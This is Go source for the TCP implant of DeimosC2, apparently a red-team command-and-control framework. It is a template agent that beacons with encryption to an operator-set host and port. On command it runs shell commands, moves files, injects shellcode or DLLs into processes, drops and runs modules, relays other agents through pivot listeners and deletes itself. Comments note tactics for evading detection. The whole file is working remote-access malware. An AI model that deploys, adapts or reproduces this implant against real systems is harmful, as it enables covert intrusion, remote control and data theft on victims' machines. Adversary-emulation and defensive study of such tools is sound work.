package main

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"net"
	"net/rpc"
	"net/rpc/jsonrpc"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	mrand "math/rand"

	"github.com/DeimosC2/DeimosC2/agents/resources/agentfunctions"
	"github.com/DeimosC2/DeimosC2/agents/resources/selfdestruction"
	"github.com/DeimosC2/DeimosC2/agents/resources/shellinject"
	"github.com/DeimosC2/DeimosC2/lib/agentscommon"
	"github.com/DeimosC2/DeimosC2/lib/crypto"
	"github.com/DeimosC2/DeimosC2/lib/logging"
	"github.com/DeimosC2/DeimosC2/lib/modulescommon"
)

var rpcUp = false
var pList agentfunctions.PivotList //Holds the pivot listener
var key string
var ip = "{{HOST}}"
var port = "{{PORT}}"
var delay = {{DELAY}}
var jitter = {{JITTER}}
var eol = "{{EOL}}"
var liveHours = "{{LIVEHOURS}}"
var pubKey []byte
var stringPubKey = `{{PUBKEY}}`
var modPort int

//ModData is used for RPC
type ModData int

func main() {
	//convert the cert to a byte array
	pubKey = []byte(stringPubKey)

	for {
		agentfunctions.CheckTime(liveHours)
		if key == "" || key == "000000000000000000000000000000000000" {
			connect("init", "")
		} else {
			go connect("check_in", "")
		}
		agentfunctions.SleepDelay(delay, jitter)
		agentfunctions.ShouldIDie(eol)
	}
}

//Makes the connection to the listener
func connect(connType string, data string) {
	defer logging.TheRecovery()
	conn, err := net.Dial("tcp", ip+":"+port)
	if err != nil {
		agentfunctions.ErrHandling(err.Error())
		return
	}
	switch connType {
	case "init":
		msg := agentfunctions.FirstTime(key)
		aesKey := sendMsg(conn, msg, []byte("0"))
		key = recvMsg(conn, aesKey)
	case "check_in":
		checkIn(conn)
	}
}

//sendMsg takes in an array of bytes and sends it to the listener
func sendMsg(conn net.Conn, data []byte, cType []byte) []byte {
	msgLen := make([]byte, 8)
	var fullMessage []byte
	pub := crypto.BytesToPublicKey(pubKey)
	aesKey := make([]byte, 32)
	if key == "" {
		key = "000000000000000000000000000000000000"
	}
	_, _ = rand.Read(aesKey)
	named := append(cType, key...)
	combined := append(named, aesKey...)
	encPub := crypto.EncryptWithPublicKey(combined, pub)
	encMsg := crypto.Encrypt(data, aesKey)
	final := append(encPub, encMsg...)
	binary.BigEndian.PutUint64(msgLen, uint64(len(final)))
	fullMessage = append(msgLen, final...)
	conn.Write(fullMessage)
	return aesKey
}

func recvMsg(conn net.Conn, aesKey []byte) string {
	//read the first 4 bytes which are the length
	rawMsgLen := make([]byte, 8)
	_, err := conn.Read(rawMsgLen)
	if err != nil {
		agentfunctions.ErrHandling(err.Error())
	}

	message := make([]byte, 0)
	readBuffer := make([]byte, 1024)
	readLength := uint64(0)
	for {
		n, err := conn.Read(readBuffer)
		message = append(message, readBuffer[:n]...)
		readLength += uint64(n)
		if readLength == binary.BigEndian.Uint64(rawMsgLen) {
			break
		}
		if err != nil {
			agentfunctions.ErrHandling(err.Error())
		}
	}

	decMsg := crypto.Decrypt(message, aesKey)
	var p = &aesKey
	*p = nil
	return (string(decMsg))
}

func getKey(conn net.Conn) {
	//Set First AES Key
	aesKey := make([]byte, 32)
	_, _ = rand.Read(aesKey)

	//Send just the msgtype and a random AES key to the listener
	sendMsg(conn, aesKey, []byte("0"))

	//Get agent key
	key = recvMsg(conn, aesKey)
}

//Sends the job output and then revieves new jobs to execute
func checkIn(conn net.Conn) {
	agentfunctions.AllOutput.Mutex.Lock()
	msg, err := json.Marshal(&agentfunctions.AllOutput.List)
	if err != nil {
		agentfunctions.ErrHandling(err.Error())
	}
	//deletes all the keys
	for key := range agentfunctions.AllOutput.List {
		delete(agentfunctions.AllOutput.List, key)
	}
	agentfunctions.AllOutput.Mutex.Unlock()
	agentfunctions.JobCount = 0
	if len(msg) == 0 {
		msg = append(msg, []byte("{}")...)
	}
	//Sends the job output
	aesKey := sendMsg(conn, msg, []byte("2"))
	//Recv new jobs
	newJobs := recvMsg(conn, aesKey)
	var j []agentfunctions.AgentJob
	err = json.Unmarshal([]byte(newJobs), &j)
	if err != nil {
		agentfunctions.ErrHandling(err.Error())

	}
	if len(j) > 0 {
		jobExecute(j)
	}
}

func jobExecute(j []agentfunctions.AgentJob) {
	for _, value := range j {
		switch value.JobType {
		case "shell":
			go agentfunctions.Shell(value.Arguments, false)
		case "download":
			go agentfunctions.Download(value.Arguments[0])
		case "upload":
			go agentfunctions.Upload(value.Arguments[0], value.Arguments[1], value.Arguments[2])
		case "fileBrowser":
			go agentfunctions.AgentFileBrowsers(value.Arguments[0])
		case "options":
			go options(value.Arguments[0], value.Arguments[1])
		case "shellInject":
			go shellinject.ShellInject(value.Arguments[0], value.Arguments[1])
		case "module":
			go execMod(value.Arguments[0], value.Arguments[1], value.Arguments[2])
		case "reinit":
			go connect("init", "")
		case "pivotTCP":
			if (pList !=  agentfunctions.PivotList{}) {
				continue
			}
			var success bool
			pList.Listener, success = startTCPPivotServer(value.Arguments[0], []byte(value.Arguments[1]))
			resp := "Pivot Listener Failed"
			if success == true {
				pList.ListChan = make(chan bool)
				go agentfunctions.KillNetList(pList.Listener, &pList)
				resp = "Pivot Listener Successfully Stood Up"
			}
			agentfunctions.AllOutput.Mutex.Lock()
			agentfunctions.JobCount++
			agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{
				JobName: "pivotTCP",
				Results: resp,
			}
			agentfunctions.AllOutput.Mutex.Unlock()
		case "pivotJob":
			var p []agentfunctions.AgentJob
			err := json.Unmarshal([]byte(value.Arguments[0]), &p)
			if err != nil {
				agentfunctions.ErrHandling(err.Error())

			}
			agentfunctions.AllPivotJobs.Mutex.Lock()
			if val, ok := agentfunctions.AllPivotJobs.List[p[0].AgentKey]; ok {
				val.Jobs = append(val.Jobs, p[0])
			}
			agentfunctions.AllPivotJobs.Mutex.Unlock()
		case "pivotKill":
			pList.ListChan <- true
			pList = agentfunctions.PivotList{}//reset the var so listener can be made started again
		case "kill":
			agentfunctions.Kill()
			connect("check_in", "")
			selfdestruction.SelfDelete()
			os.Exit(0)
		}
	}
}

//TODO ADD VALIDATION HERE
func options(o string, n string) {
	switch o {
	case "jitter":
		n, err := strconv.ParseFloat(n, 64)
		if err != nil {
			agentfunctions.ErrHandling(err.Error())
			return
		}
		jitter = n
	case "delay":
		n, err := strconv.ParseFloat(n, 64)
		if err != nil {
			agentfunctions.ErrHandling(err.Error())
			return
		}
		delay = n
	case "eol":
		eol = n
	case "hours":
		liveHours = n
	}
}

/*Module refactor:
new module job format should be {jobtype:"module",Arguments: ["module to execute","exectype", "base64d module"]}}
in order for this to happen the front end will request a module, the server will see what type of agent it is (aka windows/darwin/etc and then it will base64 that binary down to the user)
*/
func execMod(moduleName string, execType string, moduleData string) {
	binary, err := base64.StdEncoding.DecodeString(moduleData)
	if err != nil {
		agentfunctions.ErrHandling(err.Error())
		return
	}

	//We dont wanna start the RPC server until at least one module is called, this makes it harder to detect because a port isn't opened right off the bat when the agent is spun up
	if rpcUp == false {
		go moduleServer()
	}

	switch execType {

	case "drop":
		cwd, _ := os.Getwd()
		env := runtime.GOOS

		//TODO randomize this 
		var filename string
		if env == "windows" {
			filename = moduleName + ".exe"
		} else {
			filename = moduleName
		}

		fullFileName := agentfunctions.SaveFile(binary, cwd, filename)
		//Once it's downloaded then execute
		if fullFileName != "" {
			cmd := exec.Command(fullFileName, strconv.Itoa(modPort))
			cmd.Start()
		}
	case "inject":
		sc := hex.EncodeToString([]byte(binary))
		//Inject the reflective dll into the process
		shellinject.ShellInject(sc, "")
	}

}

//Starts the RPC server for modules
func moduleServer() {
    modPort = mrand.Intn(65535 - 49152) + 49152
	modRPC := new(ModData)
	rpc.Register(modRPC)
	rpc.HandleHTTP()
	//TODO Port needs to be randomized in the future, hard coded right now.
	var l net.Listener
	var e error
	for {
		s := strconv.Itoa(modPort)
		l, e = net.Listen("tcp", "127.0.0.1:"+s)
		if e == nil {
			break
		}
		modPort++
	}

	//will need to go this so that it runs in the background.
	rpcUp = true
	for {
		conn, err := l.Accept()
		if err != nil {
			agentfunctions.ErrHandling(err.Error())
			return
		}

		go rpc.ServeCodec(jsonrpc.NewServerCodec(conn))
	}
}

//ReturnData takes in a string from a module and passes that back to the server as job output.
func (t *ModData) ReturnData(data modulescommon.ModuleCom, reply *int) error {
	data.AgentKey = key
	msg, err := json.Marshal(data)
	if err != nil {
		agentfunctions.ErrHandling( err.Error())
		return nil

	}
	agentfunctions.AllOutput.Mutex.Lock()
	agentfunctions.JobCount++
	agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{
		JobName: "module",
		Results: string(msg),
	}
	agentfunctions.AllOutput.Mutex.Unlock()
	return nil
}

//SendData -> modules use this to send data back to the server
func (t *ModData) SendData(data *modulescommon.ModuleCom, reply *int) error {
	data.AgentKey = key
	conn, err := net.Dial("tcp", ip+":"+port)
	if err != nil {
		agentfunctions.ErrHandling(err.Error())
		return nil
	}
	msg, err := json.Marshal(data)
	if err != nil {
		agentfunctions.ErrHandling(err.Error())
	}

	sendMsg(conn, msg, []byte("6"))
	return nil
}

//startTCPPivotServer takes in the data needed to start the listener server
//Data needed to start the listener: the private key,
func startTCPPivotServer(listenPort string, pr []byte) (net.Listener, bool) {
	l, err := net.Listen("tcp", ":"+listenPort)

	if err != nil {
		agentfunctions.ErrHandling(err.Error())
		return l, false
	}
	go serverRun(l, pr)
	return l, true
}

func serverRun(l net.Listener, pr []byte) {
	for {
		conn, err := l.Accept()
		if err != nil {
			agentfunctions.ErrHandling(err.Error())
			return
		}
		go handleConnection(conn, pr)
	}
}

func handleConnection(conn net.Conn, pr []byte) {
	defer logging.TheRecovery()

	data, msgType, agentKey, aesKey := listenerRecvMsg(conn, pr)
	//Everytime we need to check like its a check in because even registrations are based on checkins

	//if not {} then add the job as a pivot job
	//check for any jobs it might have itself
	job := agentscommon.PivotOutput{
		AgentKey: agentKey,
		MsgType:   msgType,
		Data:      data,
	}

	switch msgType {
	//Basically a pure pass through that allows the new agent to get it's name immediently
	case "0":
		//Send just the msgtype and a random AES key to the listener
		//need a new conn for this call
		newConn, err := net.Dial("tcp", ip+":"+port)
		if err != nil {
			agentfunctions.ErrHandling(err.Error())
			return
		}
		job.AgentKey = key //Done so i know the OG link
		msg, err := json.Marshal(job)
		if err != nil {
			agentfunctions.ErrHandling(err.Error())
			return
		}
		NewAESKey := sendMsg(newConn, msg, []byte("3"))
		//Get agent key
		// if we recieve a sleep order then do that
		response := recvMsg(newConn, NewAESKey)
		listenerSendMsg(conn, []byte(response), aesKey)

		agentfunctions.AllPivotJobs.Mutex.Lock()
		agentfunctions.AllPivotJobs.List[response] = &agentfunctions.PivotJobs{}
		agentfunctions.AllPivotJobs.Mutex.Unlock()

	case "2":
		//Will need to send back anything waiting the agent at this point
		agentfunctions.AllOutput.Mutex.Lock()
		agentfunctions.JobCount++
		msg, err := json.Marshal(job)
		if err != nil {
			agentfunctions.ErrHandling(err.Error())
			return
		}
		agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{
			JobName: "pivot",
			Results: string(msg),
		}
		agentfunctions.AllOutput.Mutex.Unlock()

		agentfunctions.AllPivotJobs.Mutex.Lock()
		if val, ok := agentfunctions.AllPivotJobs.List[agentKey]; ok {
			msg, err = json.Marshal(val.Jobs)
			if err != nil {
				agentfunctions.ErrHandling(err.Error())
			}
			val.Jobs = nil
			listenerSendMsg(conn, msg, aesKey)
		}
		agentfunctions.AllPivotJobs.Mutex.Unlock()

	case "3": //Straight pass through of pivot data
		newConn, err := net.Dial("tcp", ip+":"+port)
		if err != nil {
			agentfunctions.ErrHandling(err.Error())
			return
		}
		NewAESKey := sendMsg(newConn, []byte(data), []byte("3"))
		response := recvMsg(newConn, NewAESKey)
		listenerSendMsg(conn, []byte(response), aesKey)
	case "6":
		newConn, err := net.Dial("tcp", ip+":"+port)
		if err != nil {
			agentfunctions.ErrHandling(err.Error())
			return
		}
		msg, err := json.Marshal(job)
		if err != nil {
			agentfunctions.ErrHandling(err.Error())
			return
		}
		NewAESKey := sendMsg(newConn, msg, []byte("3"))
		response := recvMsg(newConn, NewAESKey)
		listenerSendMsg(conn, []byte(response), aesKey)
	case "7":
		// conn.Write(Dropper(data, newListener.Key))
		// conn.Close()
	default:
		agentfunctions.ErrHandling("How did you get here?")
		return
	}

}

func listenerRecvMsg(conn net.Conn, pr []byte) (string, string, string, []byte) {
	//read the first 4 bytes which are the length
	rawMsgLen := make([]byte, 8)
	_, err := conn.Read(rawMsgLen)
	if err != nil {
		agentfunctions.ErrHandling(err.Error())
		return "", "", "", nil
	}
	message := make([]byte, 0)
	readBuffer := make([]byte, 1024)
	readLength := uint64(0)
	for {
		n, err := conn.Read(readBuffer)
		message = append(message, readBuffer[:n]...)
		readLength += uint64(n)
		if readLength == binary.BigEndian.Uint64(rawMsgLen) {
			break
		}
		if err != nil {
			agentfunctions.ErrHandling(err.Error())
			return "", "", "", nil
		}
	}

	var msgType string
	var agentKey string
	var plaintext string

	//If connection is a dropper
	if len(message) == 39 {
		msgType = "7"
		plaintext = string(message)
		return plaintext, msgType, agentKey, nil
	}

	priv := crypto.BytesToPrivateKey(pr)
	decRSA := crypto.DecryptWithPrivateKey(message[0:256], priv)
	msgType = string(decRSA[0])
	var aesKey []byte

	agentKey = string(decRSA[1:37])
	aesKey = decRSA[37:]
	decMsg := crypto.Decrypt(message[256:], aesKey)
	plaintext = string(decMsg)

	message = nil
	return plaintext, msgType, agentKey, aesKey
}

//sendMsg takes in an array of bytes and sends it to the agent
func listenerSendMsg(conn net.Conn, data []byte, aesKey []byte) {
	encMsg := crypto.Encrypt(data, aesKey)
	msgLen := make([]byte, 8)
	binary.BigEndian.PutUint64(msgLen, uint64(len(encMsg)))
	fullMessage := append(msgLen, encMsg...)
	conn.Write(fullMessage)
}
